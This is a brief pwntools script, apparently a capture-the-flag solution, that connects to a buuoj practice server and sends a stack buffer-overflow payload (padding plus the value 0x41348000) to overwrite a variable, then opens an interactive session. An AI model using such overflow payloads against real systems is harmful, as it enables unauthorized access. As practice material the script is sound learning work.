from pwn import *
p = remote("node3.buuoj.cn",25132)
ans = 0x41348000
payload = 'a'*(0x30 - 0x4) + p64(ans)
p.sendline(payload)
p.interactive()
